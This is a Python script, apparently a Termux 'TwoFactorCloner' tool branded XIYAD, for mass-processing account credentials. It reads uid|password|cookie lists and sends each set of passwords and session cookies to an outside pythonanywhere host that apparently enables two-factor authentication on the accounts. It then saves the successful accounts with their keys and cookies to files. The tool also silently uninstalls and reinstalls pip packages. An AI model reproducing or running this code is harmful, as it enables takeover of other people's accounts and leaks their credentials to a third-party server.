#_______RIYAD-MAHFUZ__________
 
import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')
print('\033[92;1m>>\033[1;37m Installing missing modules ...')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
try:
    import requests
except ImportError:
    print('\n\033[92;1m>>\033[1;37m Installing requests !...\n')
    os.system('pip install requests')
    

try:
    import concurrent.futures
except ImportError:
    print('\n\033[92;1m>>\033[1;37m Installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    os.system('clear')
    print('\n\033[92;1m>>\033[1;37m Installing bs4 !...\n')
    os.system('pip install bs4')
    
    time.sleep(1.5)
    os.system('git pull')

    os.system('pkg install curl')
try:
    import requests 
except ImportError:
    print('\n\033[92;1m>>\033[1;37m Installing Requests ...\n')
    os.system('pip install requests')


try:
    import concurrent.futures
except ImportError:
    print('\n\033[92;1m>>\033[1;37m Installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as XiyadXiyad
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
try:os.mkdir('/sdcard/XD-2F')
except:pass
 
class TwoFactorCloner:
    GREEN = '\x1b[1;92m'
    RED = '\x1b[1;91m'
    YELLOW = '\x1b[1;93m'
    WHITE = '\x1b[1;97m'
    
    def __init__(self):
        self.ok = 0
        self.fail = 0
        
 
    def AUTO_2F(self, uid, password, cookie):
        if "sb=" not in cookie:
            sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
            cookie = f"sb={sb};{cookie}"
        else:
            pass
        cookies = {"Cookie" : cookie}
        link = f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}"
        send_req = requests.get(link).text
        return send_req

    def divider(self):
        print(f"\33[1;37m-------------------------------------------------------""")

    def run(self):
        os.system("clear")
        print(f" db    db d888888b db    db  .d8b.  d8888b.   ")
        print(f" `8b  d8'   `88'   `8b  d8' d8' `8b 88  `8D ")
        print(f"  `8bd8'     88     `8bd8'  88ooo88 88   88   ")
        print(f"  .dPYb.     88       88    88~~~88 88   88")
        print(f" .8P  Y8.   .88.      88    88   88 88  .8D   ")
        print(f" YP    YP Y888888P    YP    YP   YP Y8888D'  \033[92;1mX \033[1;37mI \033[92;1mY \033[1;37mA \033[92;1mD")
        print(f"\33[1;37m-------------------------------------------------------""")
        print(f"\033[92;1m>>  \033[1;37mOwner        \033[1;32m :  \033[92;1mX \033[1;37mI \033[92;1mY \033[1;37mA \033[92;1mD")
        print(f"\033[92;1m>>  \033[1;37mFacebook     \033[1;32m :\033[1;97m  Riyad Mahfuz")
        print(f"\033[92;1m>>  \033[1;37mFacebook User\033[1;32m :\033[1;97m  xiyad.404")
        print(f"\033[92;1m>>  \033[1;37mGithub       \033[1;32m :\033[1;97m  xiyad")
        print(f"\033[92;1m>>  \033[1;37mTool Type    \033[1;32m :\033[1;97m  \033[91;1m2FF")
        print(f"\033[92;1m>>  \033[1;37mVersion      \033[1;32m :\033[1;97m  \033[91;1mPRSONAL")
        self.divider()
        get_file = input("\033[1;37mEnter file path:\033[92;1m ")
        self.divider()
        try:
            get_file_info = open(get_file, 'r').read().splitlines()
        except FileNotFoundError:
            exit("\033[92;1m>>\033[91;1mFile not found")
            run(self)
        for element in get_file_info:
            if element == "":
                break
            try:
                uid, password, cookie = element.split("|")
            except ValueError:
                self.divider()
                print(f"{self.YELLOW}[WRONG FORMAT] " + element)
                self.divider()
                with open("/sdcard/XD-2F/wrong_format.txt", 'a') as f:
                    f.write(element + '\n')
                continue
            data = self.AUTO_2F(uid=uid, password=password, cookie=cookie)
            if '[2F]' in data:
                datax = data.replace("[2F] ", "")
                print(f"{self.GREEN}[XD]-[2F] {datax}")
                self.ok += 1
                with open("/sdcard/XD-2F/2f_live.txt", 'a') as f:
                    f.write(element + '\n')
                with open("/sdcard/XD-2F/2f_live_with_key.txt", 'a') as f:
                    f.write(datax + '\n')
                with open("/sdcard/XD-2F/2f_live_with_cookies.txt", "a") as f:
                    f.write(f"{datax}|{cookie}\n")
            elif 'Cookies lol' in data:
                print(f"{self.RED}[XD]-[FL] {data}")
                self.fail += 1
                with open("/sdcard/2f_failed.txt", 'a') as f:
                    f.write(element + '\n')
                with open("/sdcard/XD-2F/2f_failed_uid.txt", 'a') as f:
                    f.write(f"{uid}|{password}\n")
                    
            elif 'wrong password' in data:
                print(f"\033[1;34m[XD]-[WR] {data}")
                self.fail += 1
                with open("/sdcard/XD-2F/wrong_pass.txt", 'a') as f:
                    f.write(element + '\n')
            else:
                print("Error" + data)
 
        self.divider()
        print(f"\033[1;37mTotal Checked uid :\033[1;34m{len(get_file_info)} ")
        print(f"\033[1;37m2F successful : \033[1;32m{str(self.ok)}")
        print(f"\033[1;37m2F Failed: \033[1;31m{str(self.fail)}")
        self.divider()
        print(f"\033[1;37mRUN TO BACK  ")
        print(f"\033[1;34mpython xiyad.py")
        self.divider()
        
        
        
 
if __name__ == "__main__":
    cloner = TwoFactorCloner()
    cloner.run()
 